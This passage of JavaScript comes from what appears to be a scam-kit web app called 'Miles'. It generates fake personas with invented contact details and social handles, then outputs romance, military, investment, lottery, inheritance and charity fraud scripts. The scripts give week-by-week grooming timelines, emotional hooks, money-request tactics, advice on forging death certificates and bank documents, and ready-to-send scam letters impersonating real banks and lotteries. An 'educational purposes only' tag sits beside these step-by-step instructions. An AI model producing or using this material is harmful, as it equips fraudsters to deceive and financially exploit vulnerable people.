        'business': ['Networking', 'Leadership', 'Innovation', 'Travel', 'Fine Dining', 'Golf', 'Reading', 'Investing']
    };
    
    const interests = interestSets[clientType] || interestSets.student;
    const selectedInterests = interests.sort(() => 0.5 - Math.random()).slice(0, Math.floor(Math.random() * 4) + 3);
    
    return selectedInterests;
}

function generateOccupation(clientType, gender) {
    const occupations = {
        'sugar-baby': ['College Student', 'Part-time Model', 'Aspiring Actress', 'Art Student', 'Psychology Major', 'Business Student'],
        'sugar-daddy': ['CEO', 'Entrepreneur', 'Investment Banker', 'Real Estate Developer', 'Tech Executive', 'Lawyer'],
        'influencer': ['Content Creator', 'Social Media Manager', 'Lifestyle Blogger', 'Brand Ambassador', 'Digital Marketer'],
        'student': ['Computer Science Student', 'Pre-Med Student', 'Business Major', 'Engineering Student', 'Art Student'],
        'business': ['Marketing Director', 'Sales Manager', 'Consultant', 'Project Manager', 'Account Executive']
    };
    
    const jobList = occupations[clientType] || occupations.student;
    return jobList[Math.floor(Math.random() * jobList.length)];
}

function generateEducation() {
    const universities = [
        'Harvard University', 'Stanford University', 'MIT', 'Yale University', 'Princeton University',
        'Columbia University', 'University of Pennsylvania', 'Northwestern University', 'UCLA', 'USC',
        'New York University', 'Boston University', 'Georgetown University', 'Vanderbilt University'
    ];
    
    const degrees = ['Bachelor of Arts', 'Bachelor of Science', 'Master of Business Administration', 'Juris Doctor', 'Master of Arts'];
    const majors = ['Business Administration', 'Psychology', 'Marketing', 'Communications', 'International Relations', 'Economics', 'Computer Science', 'Pre-Law'];
    
    const university = universities[Math.floor(Math.random() * universities.length)];
    const degree = degrees[Math.floor(Math.random() * degrees.length)];
    const major = majors[Math.floor(Math.random() * majors.length)];
    
    return {
        university: university,
        degree: degree,
        major: major,
        full: `${degree} in ${major}, ${university}`
    };
}

function generatePhotoSuggestions(gender, race) {
    const suggestions = [
        'Professional headshot with natural lighting',
        'Casual outfit photo in urban setting',
        'Full body photo in stylish attire',
        'Lifestyle photo (coffee shop, beach, etc.)',
        'Group photo showing social life',
        'Travel photo or scenic background'
    ];
    
    return suggestions.slice(0, 4);
}

function showGeneratedClient(profile) {
    const modal = document.getElementById('generatedClientModal');
    const profileCard = document.getElementById('clientProfileCard');
    
    profileCard.innerHTML = `
        <div class="profile-header">
            <div class="profile-avatar">${getAvatarForGender(profile.gender)}</div>
            <div class="profile-basic">
                <h4>${profile.name.full}</h4>
                <p>${profile.age} years old • ${profile.location.full}</p>
                <p class="occupation">${profile.occupation}</p>
            </div>
        </div>

        <div class="profile-section">
            <h5>📱 Contact Information</h5>
            <div class="contact-info">
                <p><strong>Phone:</strong> ${profile.phone}</p>
                <p><strong>Primary Platform:</strong> ${profile.socialMedia.primary}</p>
                <p><strong>Username:</strong> ${profile.socialMedia.username}</p>
            </div>
        </div>

        <div class="profile-section">
            <h5>🌐 Social Media Profiles</h5>
            <div class="social-profiles">
                ${Object.entries(profile.socialMedia.profiles).map(([platform, handle]) => 
                    `<p><strong>${platform.charAt(0).toUpperCase() + platform.slice(1)}:</strong> ${handle}</p>`
                ).join('')}
            </div>
        </div>

        <div class="profile-section">
            <h5>✍️ Bio</h5>
            <div class="bio-content">
                ${profile.bio}
            </div>
        </div>

        <div class="profile-section">
            <h5>🎓 Education</h5>
            <p>${profile.education.full}</p>
        </div>

        <div class="profile-section">
            <h5>💫 Interests</h5>
            <div class="interests-tags">
                ${profile.interests.map(interest => `<span class="interest-tag">${interest}</span>`).join('')}
            </div>
        </div>

        <div class="profile-section">
            <h5>📸 Photo Suggestions</h5>
            <ul class="photo-suggestions">
                ${profile.photos.map(suggestion => `<li>${suggestion}</li>`).join('')}
            </ul>
        </div>

        <div class="profile-section">
            <h5>📊 Profile Stats</h5>
            <div class="profile-stats">
                <p><strong>Gender:</strong> ${profile.gender.charAt(0).toUpperCase() + profile.gender.slice(1)}</p>
                <p><strong>Ethnicity:</strong> ${profile.race.charAt(0).toUpperCase() + profile.race.slice(1)}</p>
                <p><strong>Type:</strong> ${profile.clientType.replace('-', ' ').replace(/\b\w/g, l => l.toUpperCase())}</p>
            </div>
        </div>
    `;
    
    modal.style.display = 'block';
    showNotification('🎉 Client profile generated successfully!', 'success');
}

function getAvatarForGender(gender) {
    const avatars = {
        female: '👩',
        male: '👨',
        'non-binary': '🧑'
    };
    return avatars[gender] || '👤';
}

function copyClientProfile() {
    if (!currentClientProfile) return;

    const profile = currentClientProfile;
    const textToCopy = `
👤 FAKE CLIENT PROFILE - Generated by Miles

📋 BASIC INFORMATION:
Name: ${profile.name.full}
Age: ${profile.age}
Gender: ${profile.gender.charAt(0).toUpperCase() + profile.gender.slice(1)}
Ethnicity: ${profile.race.charAt(0).toUpperCase() + profile.race.slice(1)}
Location: ${profile.location.full}
Occupation: ${profile.occupation}

📱 CONTACT DETAILS:
Phone: ${profile.phone}
Primary Platform: ${profile.socialMedia.primary}
Username: ${profile.socialMedia.username}

🌐 SOCIAL MEDIA PROFILES:
${Object.entries(profile.socialMedia.profiles).map(([platform, handle]) => 
    `${platform.charAt(0).toUpperCase() + platform.slice(1)}: ${handle}`
).join('\n')}

✍️ BIO:
${profile.bio}

🎓 EDUCATION:
${profile.education.full}

💫 INTERESTS:
${profile.interests.join(', ')}

📸 PHOTO SUGGESTIONS:
${profile.photos.map((suggestion, index) => `${index + 1}. ${suggestion}`).join('\n')}

📊 PROFILE TYPE:
${profile.clientType.replace('-', ' ').replace(/\b\w/g, l => l.toUpperCase())}

---
Generated: ${new Date().toLocaleString()}
⚠️ This is a fictional profile for educational purposes only.
    `.trim();

    navigator.clipboard.writeText(textToCopy).then(() => {
        showNotification('📋 Client profile copied to clipboard!', 'success');
        
        const copyBtn = document.getElementById('copyClientBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function regenerateClientProfile() {
    document.getElementById('generatedClientModal').style.display = 'none';
    generateClientProfile();
}

function closeClientProfile() {
    document.getElementById('generatedClientModal').style.display = 'none';
    currentClientProfile = null;
    showNotification('Ready to generate another client profile!', 'success');
}

// Format Generator Functions
let selectedFormatType = null;
let currentFormatData = null;

const formatTypes = {
    romance: {
        name: 'Romance Format',
        icon: '💕',
        description: 'Love and relationship scams',
        tips: [
            'Build emotional connection gradually',
            'Use romantic language and compliments',
            'Create urgency with emergency situations',
            'Request money for travel or emergencies',
            'Share fake photos and personal stories'
        ]
    },
    business: {
        name: 'Business Format',
        icon: '💼',
        description: 'Investment and business opportunities',
        tips: [
            'Present lucrative investment opportunities',
            'Use professional language and terminology',
            'Show fake profit statements and testimonials',
            'Create time-sensitive offers',
            'Request initial investment or registration fees'
        ]
    },
    lottery: {
        name: 'Lottery Format',
        icon: '🎰',
        description: 'Lottery and sweepstakes wins',
        tips: [
            'Announce large lottery winnings',
            'Request processing fees or taxes',
            'Use official-looking documentation',
            'Create urgency with expiration dates',
            'Reference legitimate lottery organizations'
        ]
    },
    inheritance: {
        name: 'Inheritance Format',
        icon: '💰',
        description: 'Inheritance and legal claims',
        tips: [
            'Claim to be lawyer or bank official',
            'Mention large inheritance from deceased relative',
            'Request legal fees or processing costs',
            'Use formal legal language',
            'Create documentation with official seals'
        ]
    },
    military: {
        name: 'Military Format',
        icon: '🎖️',
        description: 'Military personnel stories',
        tips: [
            'Pose as deployed military personnel',
            'Share stories of combat and service',
            'Request money for communication or travel',
            'Use military terminology and ranks',
            'Create emotional connection through sacrifice stories'
        ]
    },
    charity: {
        name: 'Charity Format',
        icon: '🤲',
        description: 'Charity and donation requests',
        tips: [
            'Appeal to humanitarian instincts',
            'Use emotional stories of suffering',
            'Request donations for fake causes',
            'Show fake documentation and photos',
            'Create urgency with crisis situations'
        ]
    }
};

function setupFormatGeneratorListeners() {
    // Format type selection
    document.querySelectorAll('.format-type-option').forEach(option => {
        option.addEventListener('click', function() {
            selectFormatType(this.dataset.format);
        });
    });

    // Generate format button
    const generateBtn = document.getElementById('generateFormatBtn');
    if (generateBtn) {
        generateBtn.addEventListener('click', generateFormat);
    }

    // Generated format modal actions
    const copyBtn = document.getElementById('copyFormatBtn');
    const regenerateBtn = document.getElementById('regenerateFormatBtn');
    const closeBtn = document.getElementById('closeFormatBtn');

    if (copyBtn) {
        copyBtn.addEventListener('click', copyGeneratedFormat);
    }

    if (regenerateBtn) {
        regenerateBtn.addEventListener('click', regenerateFormat);
    }

    if (closeBtn) {
        closeBtn.addEventListener('click', closeGeneratedFormat);
    }
}

function selectFormatType(formatType) {
    selectedFormatType = formatType;
    
    // Update UI
    document.querySelectorAll('.format-type-option').forEach(option => {
        option.classList.remove('selected');
    });
    document.querySelector(`[data-format="${formatType}"]`).classList.add('selected');

    // Show customization container
    document.getElementById('formatCustomizationContainer').style.display = 'block';
    document.getElementById('formatCustomizationContainer').scrollIntoView({ behavior: 'smooth' });
}

function generateFormat() {
    if (!selectedFormatType) {
        showNotification('Please select a format type first', 'error');
        return;
    }

    const targetName = document.getElementById('targetName').value.trim();
    const targetLocation = document.getElementById('targetLocation').value.trim();
    const formatTone = document.getElementById('formatTone').value;
    const customDetails = document.getElementById('customDetails').value.trim();

    if (!targetName) {
        showNotification('Please enter target name', 'error');
        return;
    }

    // Show generation modal
    showFormatGenerationModal();
}

function showFormatGenerationModal() {
    const modal = document.getElementById('formatGenerationModal');
    const title = document.getElementById('formatGenerationTitle');
    const formatData = formatTypes[selectedFormatType];

    title.textContent = `🤖 Generating ${formatData.name}...`;
    modal.style.display = 'block';

    // Start generation animation
    startFormatGeneration();
}

function startFormatGeneration() {
    const steps = document.querySelectorAll('#aiGenerationStatus .ai-step');
    const progressFill = document.getElementById('aiProgressFill');
    const progressText = document.getElementById('aiProgressText');

    let currentStep = 0;
    const totalSteps = steps.length;
    const stepDuration = Math.random() * 3000 + 4000; // 4-7 seconds per step

    // Progress text updates
    const progressMessages = [
        'Connecting to AI model...',
        'Analyzing target psychology...',
        'Crafting persuasive content...',
        'Optimizing for conversion...',
        'Finalizing format...',
        'Generation complete!'
    ];

    const stepInterval = setInterval(() => {
        if (currentStep < totalSteps) {
            // Remove active from previous steps
            steps.forEach(step => step.classList.remove('active'));
            
            // Activate current step
            steps[currentStep].classList.add('active');
            
            // Update progress
            const progress = ((currentStep + 1) / totalSteps) * 100;
            progressFill.style.width = progress + '%';
            progressText.textContent = progressMessages[currentStep] || 'Processing...';

            currentStep++;
        } else {
            clearInterval(stepInterval);
            
            // Generate the actual format content
            setTimeout(() => {
                generateFormatContent();
            }, 1500);
        }
    }, stepDuration);
}

function generateFormatContent() {
    const targetName = document.getElementById('targetName').value.trim();
    const targetLocation = document.getElementById('targetLocation').value.trim();
    const formatTone = document.getElementById('formatTone').value;
    const customDetails = document.getElementById('customDetails').value.trim();

    // Generate format based on type using predefined templates
    const formatContent = generateFormatByType(selectedFormatType, targetName, targetLocation, formatTone, customDetails);
    
    currentFormatData = {
        type: selectedFormatType,
        content: formatContent,
        targetName: targetName,
        targetLocation: targetLocation,
        tone: formatTone,
        details: customDetails
    };

    document.getElementById('formatGenerationModal').style.display = 'none';
    showGeneratedFormat(formatContent);
}

function generateFormatByType(type, targetName, location, tone, details) {
    const templates = {
        romance: generateRomanceFormat,
        business: generateBusinessFormat,
        lottery: generateLotteryFormat,
        inheritance: generateInheritanceFormat,
        military: generateMilitaryFormat,
        charity: generateCharityFormat
    };

    return templates[type](targetName, location, tone, details);
}

function generateRomanceFormat(targetName, location, tone, details) {
    const approaches = [
        `Romance/Military Format - Long Distance Love Connection

HOW TO APPROACH ${targetName.toUpperCase()}:

OPENING MOVES:
- Start with "I hope this message finds you well" 
- Mention you found their profile attractive and genuine
- Say you're deployed/traveling for work but felt compelled to reach out
- Compliment their photos but focus on inner beauty and character

CONVERSATION FLOW:
First few messages:
- Share you're military contractor/engineer working abroad
- Mention current location (Afghanistan/Syria/Middle East)
- Express how their profile stood out among thousands
- Ask about their day, interests, and dreams

Building connection:
- Share "personal" stories about your deployment
- Mention loneliness and wanting someone special
- Compliment their intelligence and personality 
- Start using endearing terms like "my dear" or "beautiful"

EMOTIONAL HOOKS:
- "I've been deployed for 8 months and your message brightens my day"
- "In this dangerous place, thinking of you gives me hope"
- "I believe God put you in my path for a reason"
- "I can see your pure heart through your photos"

THE SETUP (Week 2-3):
- Mention deployment ending soon
- Talk about visiting them when you return
- Share excitement about building a future together
- Start discussing plans to meet

THE CRISIS (Week 3-4):
- Sudden emergency - need to return home early
- Family crisis or medical emergency
- Need help with travel expenses/clearance fees
- "I hate to ask but you're the only one I trust"

MONEY REQUEST APPROACH:
- Never ask directly for money initially
- Mention your problem casually in conversation
- Let them offer to help first
- If they don't offer, mention you're "stuck" and "don't know what to do"
- Express reluctance to accept help
- Promise to pay back immediately when you return

SAMPLE CONVERSATION STARTER:
"Hi ${targetName}, I hope you don't mind me reaching out. I'm currently deployed overseas and came across your profile. Something about your smile and the way you carry yourself caught my attention. I don't usually do this, but I felt compelled to say hello. I'm stationed in Afghanistan for another few months, and despite being surrounded by people, I feel quite lonely. Your profile shows someone with a beautiful soul, and I'd love to get to know you better if you're open to it. How has your day been treating you?"

REMEMBER:
- Be patient, build trust first
- Show genuine interest in their life
- Share personal details to seem real
- Use proper grammar and spelling
- Be romantic but not overly sexual initially
- Always have a believable story ready`,

        `Romance/Business Format - Successful Entrepreneur Connection

TARGETING ${targetName.toUpperCase()} - BUSINESS ROMANCE APPROACH:

INITIAL CONTACT:
- Present yourself as successful businessman/entrepreneur
- Mention you're traveling for business deals
- Express that despite success, you're lonely
- Compliment their elegance and sophistication

YOUR PERSONA:
- International business consultant
- Import/export business owner  
- Real estate investor
- Oil & gas contractor
- Currently working on major deals abroad

CONVERSATION STRATEGY:
Week 1: Getting to know you
- Ask about their career and ambitions
- Share your business success stories
- Mention your travels and luxury lifestyle
- Show interest in their dreams and goals

Week 2: Building connection
- Share personal struggles despite success
- Mention previous relationships that failed due to your travels
- Express that money isn't everything, need real love
- Start planning future together

Week 3: The business crisis
- Major business deal hit unexpected snag
- Partner defaulted or government issues
- Need temporary funding to complete profitable deal
- Stress that it's short-term and very profitable

MONEY REQUEST TACTICS:
"${targetName}, I'm in a difficult situation. My business partner was supposed to transfer funds for this deal, but there's been a delay with the banks. I have $2 million profit waiting, but I need $5,000 to complete the transaction. I know we haven't met in person yet, but I trust you and I'll pay you back triple when this deal closes next week."

SAMPLE OPENER:
"Hello beautiful ${targetName}, I hope I'm not being too forward by messaging you. I'm a businessman currently in London closing some deals, and I came across your profile. Despite all my success, I realize I'm missing something important - someone special to share it with. You seem like an intelligent, sophisticated woman, exactly what I've been looking for. Would you be interested in getting to know each other?"

KEY POINTS:
- Emphasize your wealth and success
- Show screenshots of fake bank accounts
- Mention expensive cars, houses, businesses
- Promise to spoil them when you return
- Create urgency with business deadlines`
    ];

    const selectedApproach = approaches[Math.floor(Math.random() * approaches.length)];
    return selectedApproach.replace(/\${targetName}/g, targetName);
}

function generateBusinessFormat(targetName, location, tone, details) {
    return `BUSINESS/INVESTMENT FORMAT - Targeting ${targetName.toUpperCase()}

HOW TO APPROACH WITH BUSINESS OPPORTUNITY:

YOUR PERSONA:
- Investment banker or fund manager
- Work for prestigious financial institution
- Handle large inheritance/estate funds
- Based in London, Switzerland, or Dubai

INITIAL CONTACT STRATEGY:
Subject lines that work:
- "Urgent Business Proposal - Time Sensitive"
- "Confidential Investment Opportunity"
- "Estate Fund Partnership Proposal"
- "Inheritance Claim Assistance Required"

OPENING APPROACH:
"Dear ${targetName},

I hope this message finds you in good health. I am contacting you regarding a confidential business matter that requires your urgent attention. My name is Mr. James Morrison, and I work as a senior fund manager with Heritage Trust Bank here in London.

I am reaching out to you because we have a situation that could be mutually beneficial. We are currently managing an estate fund worth $18.5 million USD from a deceased client who passed away in 2018 without any known next of kin."

THE HOOK - BUILD CREDIBILITY:
- Mention working for legitimate-sounding banks
- Reference real banking regulations and procedures  
- Explain why they specifically were chosen
- Create time pressure with deadlines

THE STORY DEVELOPMENT:
Week 1: Professional introduction
- Establish credibility with business terminology
- Explain the inheritance situation professionally
- Mention legal requirements and procedures
- Ask for their cooperation as "next of kin"

Week 2: Building trust
- Send fake official documents
- Reference banking laws and regulations
- Explain profit sharing arrangement (60/40 split)
- Discuss legal documentation requirements

Week 3: Processing fees request
- Mention lawyer fees for documentation
- Court filing fees for legal paperwork
- Bank processing charges for fund transfer
- Government taxes and clearance fees

MONEY REQUEST TECHNIQUE:
"${targetName}, everything is proceeding smoothly with the documentation. However, we've encountered a small issue. The probate court requires a processing fee of $2,500 to release the inheritance documents. This is standard procedure, but it must be paid upfront before they can proceed.

I would normally handle this myself, but bank policy prohibits us from advancing fees on behalf of beneficiaries. Once you pay this fee, the entire $18.5 million will be released within 72 hours, and you'll receive your 60% share ($11.1 million).

I understand this might seem unusual, but I can provide you with the court's contact information for verification. Time is critical as we only have 5 days left to complete this process before the funds are donated to charity."

SUPPORTING DOCUMENTS TO SEND:
- Fake bank letterhead
- Forged death certificate
- Fake legal documents
- Official-looking court papers
- Bank account statements

ESCALATION TACTICS:
If they hesitate:
- Offer to reduce their required payment
- Provide fake lawyer contact for "verification"
- Send photos of fake bank building
- Create urgency with extended deadlines
- Mention other interested parties

RED FLAGS TO AVOID:
- Don't ask for too much money initially
- Never request credit card details directly
- Avoid poor grammar and spelling
- Don't use free email addresses
- Keep story consistent across messages

SAMPLE FOLLOW-UP:
"Dear ${targetName}, I hope you received my previous message regarding the inheritance fund. I wanted to follow up because time is running short. The bank's board of directors will meet this Friday to decide on the final disposition of these funds. 

If we cannot locate a suitable beneficiary by then, the entire $18.5 million will be donated to charity as per the deceased's will. I believe you are the perfect candidate for this opportunity, and I would hate to see you miss out on this life-changing amount.

Please let me know if you need any clarification or additional documentation. I am standing by to assist you through this process."

REMEMBER:
- Maintain professional tone throughout
- Use official business language
- Create believable documentation
- Build trust before requesting money
- Always have backup explanations ready`;
}

function generateLotteryFormat(targetName, location, tone, details) {
    const lotteries = [
        "UK National Lottery",
        "EuroMillions International",
        "Microsoft Corporation Lottery",
        "Facebook User Lottery",
        "Google Anniversary Lottery"
    ];

    const amounts = ["£850,000.00", "€1,250,000.00", "$750,000.00", "£1,100,000.00", "$950,000.00"];
    const refNumbers = [
        "UK/2024/WIN/147852",
        "EMI/2024/WINNER/963741",
        "MSC/2024/LUCKY/852963",
        "FB/2024/USER/741258",
        "GOG/2024/ANNIV/963852"
    ];

    const lottery = lotteries[Math.floor(Math.random() * lotteries.length)];
    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    const refNumber = refNumbers[Math.floor(Math.random() * refNumbers.length)];

    return `Subject: CONGRATULATIONS!!! You Have Won ${amount}

Dear Lucky Winner,

CONGRATULATIONS!!!

We are pleased to inform you that your email address has won ${amount} in the ${lottery} 2024 International Email Lottery Program.

Your email was selected randomly from over 500,000 email addresses worldwide. This lottery is organized to promote internet usage and computer literacy around the globe.

WINNING DETAILS:
- Ticket Number: ${Math.floor(Math.random() * 1000000)}
- Reference Number: ${refNumber}
- Winning Amount: ${amount}
- Category: First Class Winner
- Date of Draw: ${new Date().toLocaleDateString()}

To claim your prize, you must contact our Claims Agent immediately with the following information:

1. Full Name: ${targetName}
2. Address: ${location}
3. Phone Number:
4. Occupation:
5. Age:
6. Reference Number: ${refNumber}

IMPORTANT: You have only 14 days from the date of this email to claim your prize. Failure to contact our Claims Agent within this period will result in forfeiture of your winnings.

Contact our Claims Agent:
Mr. Robert Wilson
Email: claims.agent@${lottery.toLowerCase().replace(/\s+/g, '')}.org
Phone: +44-703-598-4721

NOTE: Please keep this information confidential until you have claimed your prize. You will be required to pay a processing fee of £450 to cover administrative costs and tax clearance.

Once again, congratulations on your win!

Best regards,

Mrs. Sarah Johnson
Lottery Coordinator
${lottery}
Official Website: www.${lottery.toLowerCase().replace(/\s+/g, '')}.org`;
}

function generateInheritanceFormat(targetName, location, tone, details) {
    const amounts = ["$18.5 Million", "$25.8 Million", "$32.7 Million", "$15.2 Million", "$41.3 Million"];
    const banks = [
        "HSBC Bank London",
        "Standard Chartered Bank",
        "Deutsche Bank AG",
        "Credit Suisse Private Bank",
        "UBS Investment Bank"
    ];

    const amount = amounts[Math.floor(Math.random() * amounts.length)];
    const bank = banks[Math.floor(Math.random() * banks.length)];

    return `Subject: Urgent Legal Matter - ${amount} Inheritance Claim

Dear ${targetName},

I hope this letter finds you in good health. I am Barrister John Williams, a senior partner at Williams & Associates Legal Chambers, London, UK.

I am writing to inform you about a very important and confidential matter regarding a late client of mine, Mr. Richard ${targetName.split(' ')[0] || targetName}, who died in a car accident in 2019.

Before his death, Mr. Richard deposited the sum of ${amount} (${amount.split('$')[1]} US Dollars) with ${bank} here in London. According to the bank's policy, if no next of kin comes forward to claim this fund within five years, it will be donated to charity.

After extensive investigations, we discovered that you share the same surname with our late client, and according to our findings, you are the closest living relative and rightful beneficiary to this inheritance.

REQUIRED DOCUMENTS:
1. Letter of Administration
2. Certificate of Deposit
3. Death Certificate
4. Sworn Affidavit of Next of Kin

The bank has given us a deadline of 30 days to present the rightful beneficiary, or they will donate the money to charity. I am prepared to prepare all necessary legal documents to present you as the legal beneficiary.

However, you will need to pay the legal documentation fees of $2,500 USD to enable me to obtain the required certificates from the High Court of Justice.

This is a 100% legal and risk-free transaction. Upon successful completion, you will receive 60% of the total amount while I retain 40% for my legal services.

If you are interested in this proposal, please contact me immediately with your full details:

Full Name:
Address:
Phone Number:
Occupation:
Copy of ID/Passport:

Time is running out, so please respond urgently.

Best regards,

Barrister John Williams
Senior Partner
Williams & Associates Legal Chambers
Email: j.williams@williamslaw.co.uk
Phone: +44-207-946-3874
Address: 125 Old Broad Street, London EC2N 1AR, UK`;
}

function generateMilitaryFormat(targetName, location, tone, details) {
    const ranks = ["Captain", "Major", "Colonel", "Sergeant", "Lieutenant"];
    const units = [
        "101st Airborne Division",
        "82nd Airborne Division",
        "1st Infantry Division",
        "3rd Armored Division",
        "Special Operations Command"
    ];

    const rank = ranks[Math.floor(Math.random() * ranks.length)];
    const unit = units[Math.floor(Math.random() * units.length)];

    return `Subject: Hello from Afghanistan

My Dearest ${targetName},

I hope this message finds you in perfect health and happiness. My name is ${rank} David Miller, and I am currently deployed with the ${unit} in Afghanistan.

I know this might seem unusual, but I came across your profile and felt compelled to write to you. Being thousands of miles away from home, surrounded by the harsh realities of war, I find myself longing for a connection with someone genuine and caring like you.

I have been in the military for 12 years, serving my country with honor and dedication. This deployment has been particularly challenging, and finding someone like you gives me hope and something beautiful to think about during these difficult times.

Your photos show such warmth and kindness, exactly what I've been searching for. I believe that God puts people in our lives for a reason, and I feel He has led me to you.

A little about me:
- Age: 35 years old
- From: Dallas, Texas
- Rank: ${rank}
- Unit: ${unit}
- Current deployment: Afghanistan (8 months remaining)

I would love to get to know you better, ${targetName}. I believe that despite the distance between us, we could build something beautiful and meaningful together.

Communication here is limited and expensive. I only get to use the computer for a few minutes each day, but I wanted to use this precious time to reach out to you. I hope you will give me a chance to prove that true love knows no boundaries.

I am looking for someone who values commitment, loyalty, and love - qualities that I believe you possess. When I return from this deployment, I want to have someone special waiting for me, someone I can build a future with.

Please write back if you feel any connection. I promise to be honest, faithful, and loving. All I ask is for a chance to show you what true love feels like.

Missing you already,

${rank} David Miller
Service Number: US78451236
${unit}
Forward Operating Base Shank
APO AE 09354

P.S. Please keep me in your prayers. Your letters would mean the world to me during these lonely nights.`;
}

function generateCharityFormat(targetName, location, tone, details) {
    const charities = [
        "World Health Foundation",
        "Children's Hope International",
        "Global Relief Fund",
        "United Nations Children's Fund",
        "International Red Cross Society"
    ];

    const causes = [
        "Syrian refugee children",
        "African drought victims",
        "Cancer research",
        "Earthquake survivors in Turkey",
        "Flood victims in Bangladesh"
    ];

    const charity = charities[Math.floor(Math.random() * charities.length)];
    const cause = causes[Math.floor(Math.random() * causes.length)];

    return `Subject: Urgent Appeal - Help Save Lives Today

Dear Compassionate Friend,

I hope this message finds you well. My name is Dr. Sarah Johnson, and I am the Director of Operations for ${charity}, a leading humanitarian organization dedicated to helping those in desperate need around the world.

I am writing to you today with a heavy heart but also with hope. We are facing one of the most challenging situations in our organization's history, and we urgently need your help to save lives.

THE CRISIS:
We are currently working to provide emergency aid to ${cause} who are facing unimaginable suffering. Thousands of innocent lives hang in the balance, and time is running out.

- 50,000 people are without clean water
- 15,000 children are suffering from malnutrition
- Medical supplies have run critically low
- Winter is approaching and shelter is desperately needed

YOUR IMPACT:
Just $100 can provide clean water for 20 families for a month
$250 can feed 50 children for two weeks
$500 can provide medical supplies for a mobile clinic
$1,000 can build temporary shelter for 10 families

We have identified you as someone with a generous heart who has supported humanitarian causes in the past. Your donation, no matter the size, can make a real difference in saving lives.

URGENT DEADLINE:
We have only 7 days to raise $500,000 to purchase and deliver these critical supplies. Every minute we delay means more suffering for these innocent people.

To make your donation:
1. Reply with the amount you wish to donate
2. We will send you secure payment instructions
3. Your funds will be deployed immediately to the field

100% of your donation goes directly to aid - we cover all administrative costs through separate funding.

You will receive:
- Tax-deductible receipt
- Photo updates from the field
- Detailed report on how your money was used
- Certificate of appreciation

The situation is desperate, but together we can make a difference. These people are counting on compassionate individuals like you to help them survive.

Please don't wait - lives depend on your immediate response.

With gratitude and hope,

Dr. Sarah Johnson
Director of Operations
${charity}
Email: emergency.appeal@${charity.toLowerCase().replace(/\s+/g, '')}.org
Phone: +1-555-HELP-NOW
Website: www.${charity.toLowerCase().replace(/\s+/g, '')}.org

"The best way to find yourself is to lose yourself in the service of others." - Mahatma Gandhi`;
}

function showGeneratedFormat(content) {
    const modal = document.getElementById('generatedFormatModal');
    const title = document.getElementById('generatedFormatTitle');
    const formatData = formatTypes[selectedFormatType];
    const contentElement = document.getElementById('generatedFormatContent');
    const badgeElement = document.getElementById('formatTypeBadge');
    const tipsElement = document.getElementById('formatTipsList');

    title.textContent = `📝 Generated ${formatData.name}`;
    badgeElement.textContent = formatData.name;
    contentElement.textContent = content;

    // Populate tips
    tipsElement.innerHTML = '';
    formatData.tips.forEach(tip => {
        const li = document.createElement('li');
        li.textContent = tip;
        tipsElement.appendChild(li);
    });

    modal.style.display = 'block';
    
    showNotification(`${formatData.name} generated successfully!`, 'success');
}

function copyGeneratedFormat() {
    if (!currentFormatData) return;

    const textToCopy = `${formatTypes[currentFormatData.type].name} - Generated by Miles

${currentFormatData.content}

---
Generated on: ${new Date().toLocaleString()}
Target: ${currentFormatData.targetName}
Location: ${currentFormatData.targetLocation}
Tone: ${currentFormatData.tone}

⚠️ For educational purposes only. Use responsibly.`;

    navigator.clipboard.writeText(textToCopy).then(() => {
        showNotification('📋 Format copied to clipboard!', 'success');
        
        // Visual feedback
        const copyBtn = document.getElementById('copyFormatBtn');
        const originalText = copyBtn.textContent;
        copyBtn.textContent = '✅ Copied!';
        copyBtn.style.background = 'linear-gradient(135deg, var(--success-green), var(--success-green-dark))';
        
        setTimeout(() => {
            copyBtn.textContent = originalText;
            copyBtn.style.background = 'linear-gradient(135deg, var(--primary-red), var(--primary-red-dark))';
        }, 2000);
        
    }).catch(() => {
        showNotification('Failed to copy to clipboard', 'error');
    });
}

function regenerateFormat() {
    if (!currentFormatData) return;

    // Close current modal and show generation modal
    document.getElementById('generatedFormatModal').style.display = 'none';
    
    // Regenerate with same parameters
    showFormatGenerationModal();
}

function closeGeneratedFormat() {
    document.getElementById('generatedFormatModal').style.display = 'none';
    
    // Reset form
    document.getElementById('targetName').value = '';
    document.getElementById('targetLocation').value = '';
    document.getElementById('formatTone').value = 'professional';
    document.getElementById('customDetails').value = '';
    
    // Reset selections
    selectedFormatType = null;
    currentFormatData = null;
    
    // Reset UI
    document.querySelectorAll('.format-type-option').forEach(option => {
        option.classList.remove('selected');
    });
    
    document.getElementById('formatCustomizationContainer').style.display = 'none';
    
    showNotification('Ready to generate another format!', 'success');
}

function activateAccount() {
    const code = document.getElementById('activationCode').value.trim();
    const activateBtn = document.getElementById('activateBtn');

    if (!code) {
        showNotification('Please enter activation code', 'error');
        return;
    }

    // Show loading state
    activateBtn.textContent = 'ACTIVATING...';
    activateBtn.disabled = true;

    setTimeout(() => {
        // Define master codes and limited codes
        const masterCodes = ['titobilovetheowner', 'thekillerboy123@', 'thecryptoboy123@', 'shobangs123@'];
        const limitedCodes = ['thefatherfigure123@', 'thejoiner123@'];
        
        // Check if it's a trial code and hasn't been used
        const isTrial30Code = code.startsWith('trial30_') && code === userSession.trialCode30 && !userSession.usedTrialCodes.includes(code);
        const isTrial20Code = code.startsWith('trial20_') && code === userSession.trialCode20 && !userSession.usedTrialCodes.includes(code);
        const isTrial40Code = code.startsWith('trial40_') && code === userSession.trialCode40 && !userSession.usedTrialCodes.includes(code);
        const isValidTrialCode = isTrial30Code || isTrial20Code || isTrial40Code;
        
        // Check if trial code was already used
        if ((code.startsWith('trial30_') || code.startsWith('trial20_') || code.startsWith('trial40_')) && userSession.usedTrialCodes.includes(code)) {
            showNotification('❌ Trial code already used. Each trial code can only be used once.', 'error');
            activateBtn.textContent = 'ACTIVATE ACCOUNT';
            activateBtn.disabled = false;
            return;
        }
        
        // Verify activation code
        if (code === userSession.privateKey || masterCodes.includes(code) || limitedCodes.includes(code) || isValidTrialCode) {
            userSession.activated = true;
            
            // Set account type and trial duration
            if (masterCodes.includes(code)) {
                userSession.accountType = 'master';
            } else if (limitedCodes.includes(code)) {
                userSession.accountType = 'limited';
            } else if (isValidTrialCode) {
                userSession.accountType = 'trial';
